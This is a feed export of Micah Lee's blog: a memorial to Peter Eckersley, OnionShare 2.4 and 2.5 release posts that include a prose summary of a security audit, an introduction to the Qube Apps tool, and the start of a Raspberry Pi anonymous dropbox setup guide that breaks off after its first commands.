<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>feed.xml</title><link href="https://micahflee.com/" rel="alternate"></link><link href="https://micahflee.com/feed.xml" rel="self"></link><id>urn:uuid:eaae488d-d061-3965-aa0f-8acd103b22d1</id><updated>2022-09-04T00:00:00Z</updated><author><name></name></author><entry><title>Stories about Peter Eckersley</title><link href="https://micahflee.com/2022/09/stories-about-peter-eckersley/" rel="alternate"></link><updated>2022-09-04T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:9d7ab380-5230-3f7b-bf67-e1bf628aa065</id><content type="html">&lt;p&gt;My friend Peter Eckersley tragically and unexpectedly died on Friday. I hadn't spent much time with him in the last few years, but I wish that I had because he had such a big impact on my life. Wikipedians have created an &lt;a href="https://en.wikipedia.org/wiki/Peter_Eckersley_%28computer_scientist%29"&gt;article about Peter&lt;/a&gt;, and Seth Schoen, who worked closely with me and Peter at EFF on the tech team, wrote a &lt;a href="https://community.letsencrypt.org/t/peter-eckersley-may-his-memory-be-a-blessing/183854"&gt;memorial for him&lt;/a&gt; on the Let's Encrypt forum. I thought I would share a few stories about Peter here.&lt;/p&gt;
&lt;p&gt;We worked together at EFF for years, and for most of that time he was my manager. Peter encouraged my to switch career paths from being a web developer, where I wrote lots of PHP code to maintain EFF's Drupal website and instance of CiviCRM, to a staff technologist. As a technologist I took over the &lt;a href="https://www.eff.org/https-everywhere"&gt;HTTPS Everywhere&lt;/a&gt; project, which Peter initially developed, and I got to do cool things like explain how HTTPS worked to journalists who were suddenly interested because of the Snowden revelations. (I had so many conversations with Peter about HTTPS and encrypting the web. The real problem wasn't something HTTPS Everywhere, which rewrote URLs from HTTP to HTTPS, could solve. The problem was the fact that the certificate authority cartel created an expensive barrier to entry to allow website to have basic security. This is why he cofounded &lt;a href="https://letsencrypt.org/"&gt;Let's Encrypt&lt;/a&gt;, to remove the ridiculous cost burden and make the web more secure and private. And it worked.)&lt;/p&gt;
&lt;p&gt;While working in EFF's office in the Mission district of San Francisco, we would regularly take breaks to get coffee at one of the many incredibly coffee shops that was an easy walk or bike ride away. Peter loved espresso drinks, and I also learned about his excellent policy regarding them: He would always take the time to enjoy his coffee, even if he was in a hurry. The negligible efficiency of getting coffee to go and walking it back to office just isn't worth it compared to spending five minutes to sit down and savor your cappuccino.&lt;/p&gt;
&lt;p&gt;Peter taught me what entropy is (in the information theory sense of the term), and really about the field of information theory itself. I knew that password managers measured the strength of passwords in entropy, and that you can increase the entropy of your diceware passphrases by increasing the number of words, but I didn't really get it until he explained it to me. I loved this 2010 blog post he wrote called &lt;a href="https://www.eff.org/deeplinks/2010/01/primer-information-theory-and-privacy"&gt;A Primer on Information Theory and Privacy&lt;/a&gt; which measured the number of bits of entropy it takes to uniquely identify someone. This was part of Peter's groundbreaking research in web browser fingerprinting, and the &lt;a href="https://coveryourtracks.eff.org/"&gt;Panopticlick project&lt;/a&gt; (since renamed to Cover Your Tracks).&lt;/p&gt;
&lt;p&gt;Peter was an avid road bicyclist. We road bikes all over San Francisco. Once, when we were both in Amsterdam (I think this was just after the outdoor hacker conference &lt;a href="https://en.wikipedia.org/wiki/Observe._Hack._Make."&gt;Observe. Hack. Make.&lt;/a&gt; in 2013) he had actually brought his fancy road bike to Europe with him, because he was planning on bike touring around afterwards. I had rented one of those cheap cruisers that are ubiquitous in Amsterdam. I remember we were near Centraal Station, surrounded by hundreds of bicyclists, and Peter was the only one wearing a helmet, which he had brought with him. Should he not wear his helmet, since no one else was? But he decided to wear it anyway regardless of what everyone else was doing. "That's not why I wear a helmet," he said.&lt;/p&gt;
&lt;p&gt;After I married my wife Crystal in 2012 (I'm really glad that Peter was able to travel across the country to attend my wedding), we were both in something like $20,000 of credit card debt that seemed impossible to ever pay off. Peter had savings and hated the corrupt finance industry, and so he lent us $20k at an incredibly low interest rate. We immediately paid off all of our credit card debt, and then paid him back. Without Peter it would have taken us years longer to get out of debt. I also had a really low salary at EFF when I first started ($55k, though it was higher pay than I'd ever had before). Peter helped encourage me and prepare me to ask for a raise, the first time I had ever done so--and my salary went up to something like $75k.&lt;/p&gt;
&lt;p&gt;Peter never made a Twitter account, but he kind of wanted one. The one thing stopping him was the username: @pde was already taken, and he decided he didn't want to make an account unless he could get the same three-letter username he used everywhere else.&lt;/p&gt;
&lt;p&gt;Just as Peter was an espresso connoisseur, he was also a cocktail connoisseur. I'd never actually met anyone who was as knowledgeable about cocktails as Peter before, and he really made me understand why someone would spend $15 on one (I don't drink all that much). Cocktails can be like entrees at a fancy restaurant. I remember I was at a bar with him when he described, in intricate detail, what goes into a Manhattan. "After the whiskey, you add in the vermouth, which actually makes it &lt;em&gt;less&lt;/em&gt; alcoholic, since vermouth has 15% alcohol and the whiskey has 40%."&lt;/p&gt;
&lt;p&gt;Peter encouraged me to get better at programming in Python. Now it's my favorite language. When I was a teenager I first taught myself C++ and Perl and then quickly moved onto PHP/MySQL. For many years, as a web developer, I only programmed in PHP and JavaScript. When I started at EFF I  knew a little Python (if you're proficient in one programming language you know a little of all of the rest) but PHP was still my go-to language. If a bash script I was writing started to get gnarly, I'd rewrite it in PHP. But Peter told me about how wonderful Python is at things like this compared to PHP. And how it was getting more popular and came pre-installed in every single Linux distro. He was right, Python is so much nicer than PHP, and a better tool for scripting. Since then I've programmed quite a lot of software in Python: Tor Browser Launcher, OnionShare, Dangerzone, and Semiphemeral. I'm writing a &lt;a href="https://nostarch.com/hacks-leaks-and-revelations"&gt;book&lt;/a&gt; right now that, among other things, teaches journalists and researchers to program in Python.&lt;/p&gt;
&lt;p&gt;If you work at EFF for long enough you get a 2-month paid sabbatical. Right before Peter took his, a mysterious structure appeared on the roof of EFF's office (this time in the Tenderloin, EFF had moved from the Mission). It was a gazebo that was surprisingly large. We had staff meetings where the executive director was asking everyone wtf was up with it and why it was on the roof (apparently, you need permits from the city to add structures to the roof of your building in San Francisco). It turns out,  Peter and some friends from Burning Man had built it there, I think maybe in the middle of the night, just before he left town for his sabbatical, lol.&lt;/p&gt;
&lt;p&gt;Once, I was traveling to Tunisia for a post-Arab Spring internet freedom event with Peter. I don't exactly remember the itinerary, but I think we were flying from SFO to Spain, and then on to Tunis, but our flight to Europe showed up hours late and there was only one flight to Tunis from that airport each day. The only way to get there the same night would be to fly to Paris, and then much later in the night transfer to a flight to Tunis. So we went to Paris, and since we had like 6 hours before our flight we left the airport to explore--this is the only time I've ever been to Paris, or to anywhere in France. We visited Notre-Dame, and that bridge that lovers attach locks to, and we ate at a French restaurant. To my surprise, I learned that Peter was entirely fluent in French and could just talk to everyone. This also helped in Tunisia, where people mostly speak Arabic, French, and a little English.&lt;/p&gt;
&lt;p&gt;He wasn't just fluent in French. He also &lt;em&gt;triple-majored&lt;/em&gt; in college. He had three undergraduate degrees in physics, math, and computer science, and also a PhD in computer science and law--his dissertation was about copyright and piracy. Peter really helped Crystal, my wife, who never finished high school and was just learning early math in community college (now she has a BS in physics and is an applied math grad student), realize that STEM was a possibility for her.&lt;/p&gt;
&lt;p&gt;Peter was good friends with Aaron Swartz, and they used to be roommates. After Aaron was indicted for bullshit Computer Fraud and Abuse Act charges, Peter dropped everything to organize an activism campaign at EFF in his defense. I never met Aaron myself, but I rushed to build an activism campaign website to collect signatures to send to Congress. But we never launched it, because Aaron committed suicide first. Peter, and the rest of EFF, then pushed for &lt;a href="https://www.eff.org/deeplinks/2013/06/aarons-law-introduced-now-time-reform-cfaa"&gt;Aaron's Law&lt;/a&gt;, a bill to reform the CFAA, a goal that EFF &lt;a href="https://www.eff.org/deeplinks/2022/05/dojs-new-cfaa-policy-good-start-does-not-go-far-enough-protect-security"&gt;still fights for&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I miss Peter. He was just 43 years old when he died, a huge loss for the internet and the world.&lt;/p&gt;
&lt;p&gt;I took the photo of Peter at the top of this blog post on a rooftop in Tunis, Tunisia, in 2012. It's licensed Attribution 4.0 International (CC BY 4.0).&lt;/p&gt;
</content></entry><entry><title>OnionShare 2.5 fixes security issues and adds censorship circumvention features</title><link href="https://micahflee.com/2022/01/onionshare-25-released/" rel="alternate"></link><updated>2022-01-17T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:8be5d683-8bed-3274-af3f-1ea527b63aaa</id><content type="html">&lt;p&gt;The OnionShare team has just released OnionShare 2.5! This version fixes security vulnerabilities uncovered in our first comprehensive security audit, and also includes improved censorship circumvention features. Download it from &lt;a href="https://onionshare.org"&gt;onionshare.org&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id="onionshare-s-first-security-audit"&gt;OnionShare's first security audit&lt;/h1&gt;&lt;p&gt;Late last year, the OnionShare project was lucky enough to be get a comprehensive security audit from the non-profit penetration testing group &lt;a href="https://www.radicallyopensecurity.com/"&gt;Radically Open Security&lt;/a&gt;. This work was funded by Open Technology Fund's &lt;a href="https://www.opentech.fund/labs/red-team-lab/"&gt;Red Team Lab&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Fortunately, ROS didn't find any issues with a threat level of &lt;em&gt;critical&lt;/em&gt; or &lt;em&gt;high&lt;/em&gt;, but they found 2 that were &lt;em&gt;elevated&lt;/em&gt;, 3 that were &lt;em&gt;moderate&lt;/em&gt;, and 4 that were &lt;em&gt;low&lt;/em&gt;. All vulnerabilities have been fixed in version 2.5.&lt;/p&gt;
&lt;p&gt;From the report:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;The penetration test goals were the de-anonymization of users and code execution on any of the involved parties, which was not found possible in the time allocated for the engagement. This is most likely due to the choice of offloading the client interaction and authentication fully on the Tor-browser and relying on the security assumptions of a recent and well maintained browser. Additionally, the usage of stable third party libraries for file and network handling, as well as the separation of logic and user interface exposed only a minimal attack surface. User-controlled input is minimal and in most cases sanitized or validated.&lt;/p&gt;
&lt;p&gt;...&lt;/p&gt;
&lt;p&gt;Our general impression is that the Onionshare project has no major security vulnerabilities and can be used within the
properly documented boundaries. Sane default configurations were chosen and inexperienced users are warned about
the consequences of sensitive configuration changes.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Check out the &lt;a href="https://raw.githubusercontent.com/onionshare/onionshare/develop/security/2021%20Penetration%20Test%20Report.pdf"&gt;full penetration test report&lt;/a&gt;, which I summarize at the end of this post.&lt;/p&gt;
&lt;h1 id="improved-censorship-circumvention"&gt;Improved censorship circumvention&lt;/h1&gt;&lt;p&gt;It's becoming alarmingly more common to see hostile governments pressure internet providers to block access to the Tor network. For example, in December, several &lt;a href="https://ooni.org/post/2021-russia-blocks-tor/"&gt;Russian ISPs started blocking Tor as well as censoring access to torproject.org&lt;/a&gt;. Because OnionShare relies on Tor, this means that Russia is preventing people from using OnionShare as well.&lt;/p&gt;
&lt;p&gt;This update greatly improves our support for &lt;em&gt;bridges&lt;/em&gt;, which let people quickly and easily circumvent this sort of censorship. A bridge is a Tor server, generally with a secret IP address so it's harder to block, that just forwards traffic onto the Tor network for people. So if you live in Moscow and you can't connect to Tor because your ISP is blocking the IP addresses of public Tor nodes, you can configure OnionShare (or Tor Browser) to use a bridge. This way you'll connect to an IP address that isn't blocked, thus bypassing the censorship.&lt;/p&gt;
&lt;p&gt;OnionShare has supported bridges for some time, but one of the coolest features of this release is the ability to automatically fetch bridges from the &lt;a href="https://bridges.torproject.org/"&gt;BridgeDB service&lt;/a&gt; directly from the settings tab.&lt;/p&gt;
&lt;p&gt;&lt;img src="moat1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;When you click "Request a New Bridge", you must solve a CAPTCHA to get access to the bridge settings.&lt;/p&gt;
&lt;p&gt;&lt;img src="moat2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;But if the ISP is already blocking access to the Tor network and to torproject.org, what stops them from blocking BridgeDB also? To prevent this from happening, OnionShare uses a tool called &lt;a href="https://gitlab.torproject.org/legacy/trac/-/wikis/doc/meek/"&gt;meek&lt;/a&gt; that uses a technique called &lt;a href="https://www.bamsoftware.com/papers/fronting/"&gt;domain fronting&lt;/a&gt; to disguise the request to BridgeDB as an innocuous request to a major CDN, the kind that you make thousands of times a day as you use the web. This prevents these countries from being able to block the BridgeDB request without blocking the whole CDN itself, which would break large portions of the internet for its users.&lt;/p&gt;
&lt;p&gt;OnionShare has also added support for &lt;a href="https://snowflake.torproject.org/"&gt;Snowflake bridges&lt;/a&gt; which uses WebRTC (the technology that we all use for our all-too-frequent video conferences) to allow anyone to quickly and easily run a bridge.&lt;/p&gt;
&lt;p&gt;If you want to help censored users connect to Tor, you can actually just turn on Snowflake in the sidebar of my blog. As long as this tab is open, your browser will be running a Snowflake bridge.&lt;/p&gt;
&lt;h1 id="summary-of-onionshare-2-4-s-security-audit"&gt;Summary of OnionShare 2.4's security audit&lt;/h1&gt;&lt;h3 id="improper-input-sanitization-and-an-out-of-bounds-read-in-qt"&gt;Improper input sanitization and an out-of-bounds read in Qt&lt;/h3&gt;&lt;p&gt;If a user was running the graphical version of OnionShare and an attacker entered a malicious string containing HTML in the path of the URL, and the user running OnionShare opened the History pane (which is collapsed by default), this HTML would be rendered by Qt, the library that OnionShare uses for its GUI.&lt;/p&gt;
&lt;p&gt;When the ROS pen testers discovered that they could use this to display arbitrary images in the History pane, they started attacking Qt's image rendering and &lt;em&gt;uncovered a vulnerability in Qt's image renderer&lt;/em&gt;. When used in conjunction with this sanitization issue in OnionShare, an out-of-bounds read was possible, causing OnionShare to crash.&lt;/p&gt;
&lt;p&gt;ROS responsibly disclosed this vulnerability to the upstream Qt project which has fixed the issues. We're really proud that our project helped make Qt more secure.&lt;/p&gt;
&lt;h3 id="receive-mode-s-request-limit-was-easily-dos-able"&gt;Receive mode's request limit was easily DoS-able&lt;/h3&gt;&lt;p&gt;Receive mode had a rate limit built in to try to prevent race conditions with folder creation during concurrent uploads. It turns out that it's pretty easy to force a denial-of-service attack by submitting the form more than 100 times per second, which would prevent authentic requests from being submitted. We solved this by using microseconds in the folder creation system, which now makes it impractical to hit the rate limit.&lt;/p&gt;
&lt;h3 id="chat-mode-issues"&gt;Chat mode issues&lt;/h3&gt;&lt;p&gt;ROS discovered that there were a variety of issues in Chat mode, most of which were closely related to one another, and so were fixed all at once. They were mostly impersonation attacks. These included:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The ability to change your username to something almost identical to that of another user, like by having whitespace at the end of the username, or by using special characters&lt;/li&gt;
&lt;li&gt;It was possible to join the chat but not emit the &lt;code&gt;join&lt;/code&gt; event, which meant you were effectively invisible in the room, unbeknownst to the other parties, which might be a privacy issue&lt;/li&gt;
&lt;li&gt;Similar to the above, it was possible to post messages to the chat room without technically being visible, or with another person's username, leading to confusion or impersonation&lt;/li&gt;
&lt;li&gt;And again, similar to the above, it was possible to spoof the &lt;code&gt;leave&lt;/code&gt; event, making people think you had left the chat room when in fact you were still able to read subsequent chat messages&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="minor-issues"&gt;Minor issues&lt;/h3&gt;&lt;p&gt;ROS also discovered a handful of minor issues, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Linux packaging using Snapcraft and Flatpak could be hardened prevent read-only access to the user's home folder&lt;/li&gt;
&lt;li&gt;The Content Security Policy header could be disabled but not configured&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It's important to keep in mind that because of how OnionShare is designed, all of the vulnerabilities discovered could only be exploited if the attacker had access to the OnionShare site. It would either need to be a publicly advertised OnionShare address, or the attacker would need to intercept or be directly sent an OnionShare address and private key.&lt;/p&gt;
&lt;p&gt;I want to take the opportunity to thank Radically Open Security, as well as the Open Technology Fund, for conducting such a comprehensive audit. ROS is a talented and professional organization, and it was really easy to work with them to address these issues.&lt;/p&gt;
</content></entry><entry><title>Qube Apps: a Flatpak-based app store for each qube</title><link href="https://micahflee.com/2021/11/introducing-qube-apps/" rel="alternate"></link><updated>2021-11-01T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:974235cd-5dde-3923-b04d-aa08f2429b77</id><content type="html">&lt;p&gt;I really like &lt;a href="https://www.qubes-os.org/"&gt;Qubes&lt;/a&gt; but I haven't been using it a lot lately. I have a Qubes laptop that I use for specific high security tasks, but my daily driver the last few months has been Ubuntu or &lt;a href="https://pop.system76.com/"&gt;Pop!_OS&lt;/a&gt; (I really like the tiling windows and the design), and sometimes macOS. Qubes is great, but it can be cumbersome to use.&lt;/p&gt;
&lt;p&gt;But then I did something silly. I downloaded documents from an anonymous person on the internet that I was interested in looking at. One of them was in a strange format I wasn't familiar with, but I found an open source tool that could load the document, so I installed that and then opened it... and then it immediately crashed. Was it just a glitch, or did I just get hacked? Ugh, this is why I should be using Qubes. In Qubes, I could do this in a disposable, networkless qube so that if it did try to hack me it wouldn't have access to any of my data, or even the internet.&lt;/p&gt;
&lt;p&gt;Now that I'm back on Qubes, I decided to write a little utility called &lt;a href="https://github.com/micahflee/qube-apps"&gt;Qube Apps&lt;/a&gt; that helps make it a little less cumbersome. It's a simple graphical wrapper around &lt;code&gt;flatpak&lt;/code&gt; that lets you install, run, and update apps inside a single qube, giving you easy access to everything available in the Linux app store &lt;a href="https://flathub.org/home"&gt;Flathub&lt;/a&gt;, and installing it all in your private storage so you don't need to constantly fiddle with your templates.&lt;/p&gt;
&lt;p&gt;Here's how it works. Each qube is based on either a Fedora or Debian template. If you have a &lt;code&gt;work&lt;/code&gt; qube that's based on &lt;code&gt;fedora-34&lt;/code&gt; and you want to install Slack in it, you need to first install Slack in the &lt;code&gt;fedora-34&lt;/code&gt; template, and then you'll be able to run it in &lt;code&gt;work&lt;/code&gt;. But this means you'll also have Slack installed in every other qube that's based on &lt;code&gt;fedora-34&lt;/code&gt;, and you might not want this. What if in addition to &lt;a href="https://flathub.org/apps/details/com.slack.Slack"&gt;Slack&lt;/a&gt;, you also want &lt;a href="https://flathub.org/apps/details/com.discordapp.Discord"&gt;Discord&lt;/a&gt;, &lt;a href="https://flathub.org/apps/details/com.visualstudio.code"&gt;Visual Studio Code&lt;/a&gt;, &lt;a href="https://flathub.org/apps/details/org.signal.Signal"&gt;Signal Desktop&lt;/a&gt;, and &lt;a href="https://flathub.org/apps/details/com.spotify.Client"&gt;Spotify&lt;/a&gt;? Should you install all of this in your template even if you only need these apps in a single qube?&lt;/p&gt;
&lt;p&gt;The answer is to install all of these as Flatpak apps, and to use &lt;code&gt;--user&lt;/code&gt; when you run the &lt;code&gt;flatpak&lt;/code&gt; commands which will run without root and install the software into your &lt;code&gt;~/.local/share/flatpak/&lt;/code&gt; folder, which is in your qube's private storage, so it will still be there the next time you reboot it. This is also more secure than using software installed through traditional package managers like &lt;code&gt;dnf&lt;/code&gt; or &lt;code&gt;apt&lt;/code&gt; because Flatpak packages all run in sandboxes.&lt;/p&gt;
&lt;p&gt;Let me show you an example. I already have Qube Apps installed in my &lt;code&gt;fedora-34&lt;/code&gt; template, so let's make a new qube to test with:&lt;/p&gt;
&lt;p&gt;&lt;img src="qube-apps1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;After creating it, I open its Qube Settings, switch to the Applications tab, and add Qube Apps to the selected applications. Then I run Qube Apps in the &lt;code&gt;my-new-qube&lt;/code&gt; qube. It looks like this, because I don't have any apps from Flathub installed yet.&lt;/p&gt;
&lt;p&gt;&lt;img src="qube-apps2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;When I click "Install New App" I get a simple interface to search for apps. Let's search for Signal Desktop.&lt;/p&gt;
&lt;p&gt;&lt;img src="qube-apps3.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;This search basically just ran &lt;code&gt;flatpak search signal&lt;/code&gt; for you and displays the results. There are several results on Flathub that mention "signal" in their name or description, but the Signal Desktop one looks like it's probably the right one. If you click the Info button it will load the specific app that it's referring to on Flathub, in this case &lt;a href="https://flathub.org/apps/details/org.signal.Signal"&gt;Signal Desktop&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now, I click the Install button. This opens an interactive &lt;code&gt;xterm&lt;/code&gt; that asks if I'm sure I want to install it, and shows me installation progress.&lt;/p&gt;
&lt;p&gt;&lt;img src="qube-apps4.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Eek, it says: "Warning: Not enough disk space to complete this operation". This is a common problem that you will almost certainly run into if you're install Flatpak apps in your qubes, but it's easy to fix. Just give the qube more disk space. I'm going to change the private storage for &lt;code&gt;my-new-qube&lt;/code&gt; from 2 GB to 10 GB.&lt;/p&gt;
&lt;p&gt;&lt;img src="qube-apps5.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now that I have 10 GB of private storage, Signal Desktop finishes installing without a problem. I can run it or delete, and if I click Update Apps it will update all of the Flatpak apps I have installed to the latest versions.&lt;/p&gt;
&lt;p&gt;&lt;img src="qube-apps6.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Now I'm going to install Slack, Discord, Spotify, and Visual Studio Code as well. Easy peasy.&lt;/p&gt;
&lt;p&gt;&lt;img src="qube-apps7.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Hopefully Qube Apps will help you avoid installing tons of software in your templates, and help you run more of your apps in an inception of sandboxes.&lt;/p&gt;
&lt;p&gt;Qube Apps is licensed GPLv3 and the code is &lt;a href="https://github.com/micahflee/qube-apps"&gt;on github&lt;/a&gt;. The whole thing is a python script that's less than 400 lines of code. I programmed it last night. See the &lt;a href="https://github.com/micahflee/qube-apps/blob/main/README.md"&gt;README.md&lt;/a&gt; for instructions on building it and installing it in your template.&lt;/p&gt;
</content></entry><entry><title>Goodbye, passwords in OnionShare</title><link href="https://micahflee.com/2021/09/goodbye-passwords-in-onionshare/" rel="alternate"></link><updated>2021-09-26T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:d14442bb-7238-3df7-a748-205d34cc525b</id><content type="html">&lt;p&gt;I'm excited to announce that OnionShare 2.4 is now out and the major change in this version is that we've completely gotten rid of passwords! Private OnionShare services are now protected using private keys (aka &lt;a href="https://community.torproject.org/onion-services/advanced/client-auth/"&gt;client authentication&lt;/a&gt;) on the Tor layer instead of instead of basic authentication on the HTTP layer. Check out the new version at &lt;a href="https://onionshare.org"&gt;onionshare.org&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;Before today, OnionShare web addresses looked something like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://onionshare:constrict-purity@by4im3ir5nsvygprmjq74xwplrkdgt44qmeapxawwikxacmr3dqzyjad.onion
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The first part, &lt;code&gt;onionshare:constrict-purity&lt;/code&gt;, is an HTTP basic authentication username (always 'onionshare') and random password. Basically, if you load that address in Tor Browser without the username and password part, it would prompt the user to login. If you didn't have the password and guessed wrong enough times, OnionShare would detect a potential attack and shut down the service.&lt;/p&gt;
&lt;p&gt;Today though, the passwords are gone! OnionShare 2.4 addresses look something like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://oy5oaslxxzwib7fsjaiz5mjeyg3ziwdmiyeotpjw6etxi722pn7pqsyd.onion
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And the private keys look something like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;K3N3N3U3BURJW46HZEZV2LZHBPKEFAGVN6DPC7TY6FHWXT7RLRAQ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When you start an OnionShare service you get both, and you have to give both to the people who want to use your service. For example, lets say you want to send a super secret Nintendo ROM to your friend. You open OnionShare, drag the file in, and start the server.&lt;/p&gt;
&lt;p&gt;&lt;img src="qbert1.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;You open up an encrypted messaging app like Signal and then send &lt;em&gt;both&lt;/em&gt; the OnionShare address and the private key. When your friend opens Tor Browser and pastes the address, Tor itself will pop up a little window asking for the private key.&lt;/p&gt;
&lt;p&gt;&lt;img src="qbert2.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;If they don't have it then it's simply impossible to connect.&lt;/p&gt;
&lt;p&gt;&lt;img src="qbert3.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;Once your friend copies and pastes the correct private key, they can access the onion site like normal and download the secret Nintendo ROM.&lt;/p&gt;
&lt;p&gt;&lt;img src="qbert4.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;The command line version, of course, works the same way. Let's say you want to set up a secret chat room. You can do that like this (in this case, running the command line version from the &lt;a href="https://snapcraft.io/onionshare"&gt;snap package&lt;/a&gt;):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;onionshare.cli --chat --title "retro gamerz only"
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src="qbert5.png" alt=""&gt;
&lt;img src="qbert6.png" alt=""&gt;&lt;/p&gt;
&lt;p&gt;If you want to run a &lt;a href="https://docs.onionshare.org/2.4/en/advanced.html#turn-off-private-key"&gt;public OnionShare service&lt;/a&gt; that anyone can access and doesn't have a secret key, like if you're setting up an anonymous dropbox, then just check the "This is a public OnionShare service (disables private key)" box before starting the server, or use the &lt;code&gt;--public&lt;/code&gt; flag on the command line.&lt;/p&gt;
</content></entry><entry><title>Running an OnionShare anonymous dropbox on a Raspberry Pi</title><link href="https://micahflee.com/2021/02/onionshare-anonymous-dropbox-raspberry-pi/" rel="alternate"></link><updated>2021-02-24T00:00:00Z</updated><author><name>Micah Lee</name></author><id>urn:uuid:938c736e-d1df-37be-b123-e87e1c8b69b0</id><content type="html">&lt;p&gt;Now that the command line version of OnionShare has &lt;a href="https://micahflee.com/2021/02/onionshare-tabs-anonymous-chat-cli/"&gt;better support for running on headless Linux servers&lt;/a&gt;, I figured I should set up a dedicated &lt;a href="https://www.raspberrypi.org/"&gt;Raspberry Pi&lt;/a&gt; anonymous dropbox server, and while I'm at it document how I'm doing it in a blog post.&lt;/p&gt;
&lt;h2 id="find-a-raspberry-pi"&gt;Find a Raspberry Pi&lt;/h2&gt;&lt;p&gt;Personally, I dug through my cardboard box full of random electronics and pulled out a trusty old Raspberry Pi 3 Model B. After all, who among us doesn't have extra Raspberry Pis laying around in piles of old electronics? If you're not as fortunate as I, at the time of writing the fanciest model is the Raspberry Pi 4 Model B, and it costs $35.&lt;/p&gt;
&lt;p&gt;Raspberry Pis use microSD cards as their hard drive, so you'll also need a microSD card reader that you can plug into your computer to set it up, a micro-USB cable to provide power to your Pi, and an internet connection (ethernet is simplest, but wifi works too).&lt;/p&gt;
&lt;h2 id="install-ubuntu-server-20-04-on-the-pi"&gt;Install Ubuntu Server 20.04 on the Pi&lt;/h2&gt;&lt;p&gt;Follow &lt;a href="https://ubuntu.com/tutorials/how-to-install-ubuntu-on-your-raspberry-pi#1-overview"&gt;this tutorial that Ubuntu makes&lt;/a&gt; to install Ubuntu on your Pi -- that's what I'm doing. I'm using the Ubuntu Server 20.04.2 LTS (RPi 3/4/400) 64-bit image. Once you get to the step "4. Boot Ubuntu Server" you can come back here.&lt;/p&gt;
&lt;p&gt;I don't feel like plugging an HDMI cable and USB keyboard into my Pi, so after plugging in ethernet and power, I'm going to need to discover my Pi's IP address so I can connect to it remotely over the network. I'm using &lt;a href="https://nmap.org/"&gt;nmap&lt;/a&gt; to do this. You can install it from your Linux package manager, from Homebrew on a Mac, or from nmap's website on Windows)&lt;/p&gt;
&lt;p&gt;Because my local network IP address is &lt;code&gt;192.168.1.x&lt;/code&gt;, I'm going to scan my whole subnet (&lt;code&gt;192.168.1.0/24&lt;/code&gt;) for computers with the SSH port (22) open, and one of them is bound to be my Pi:&lt;/p&gt;
&lt;pre&gt;
$ nmap -p22 --open 192.168.1.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 17:51 PST
Nmap scan report for 192.168.1.46
Host is up (0.0015s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 256 IP addresses (7 hosts up) scanned in 3.13 seconds
&lt;/pre&gt;&lt;p&gt;There it is, my Pi's IP address is &lt;code&gt;192.168.1.46&lt;/code&gt;. So let's see if I can SSH into it. If you're following along, make sure to use the IP of &lt;em&gt;your&lt;/em&gt; Pi, as it's probably different than mine. The default username and password are both &lt;code&gt;ubuntu&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;
$ ssh ubuntu@192.168.1.46
The authenticity of host '192.168.1.46 (192.168.1.46)' can't be established.
ECDSA key fingerprint is SHA256:tdB9dxpe4dIpFfvbjNdPpPVLeBlpTXaSu6SCaabjyFc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.46' (ECDSA) to the list of known hosts.
ubuntu@192.168.1.46's password: 
You are required to change your password immediately (administrator enforced)
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-1028-raspi aarch64)
[...snip...]
&lt;/pre&gt;&lt;p&gt;Accept the fingerprint. After logging in, you're forced to reset the password. Set it to something random and save it in your password manager. You do use a &lt;a href="https://ssd.eff.org/en/module/creating-strong-passwords"&gt;password manager&lt;/a&gt;, right?&lt;/p&gt;
&lt;p&gt;After you reset your password, your connection will close and you'll need to SSH in again:&lt;/p&gt;
&lt;pre&gt;
[...snip...]
WARNING: Your password has expired.
You must change your password now and login again!
Changing password for ubuntu.
Current password: 
New password: 
Retype new password: 
passwd: password updated successfully
Connection to 192.168.1.46 closed.

$ ssh ubuntu@192.168.1.46
ubuntu@192.168.1.46's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-1028-raspi aarch64)
[...snip...]
ubuntu@ubuntu:~$ 
&lt;/pre&gt;&lt;p&gt;&lt;em&gt;(hacker voice)&lt;/em&gt; &lt;strong&gt;I'm in.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Go ahead and install updates by running:&lt;/p&gt;
&lt;pre&gt;
sudo apt update
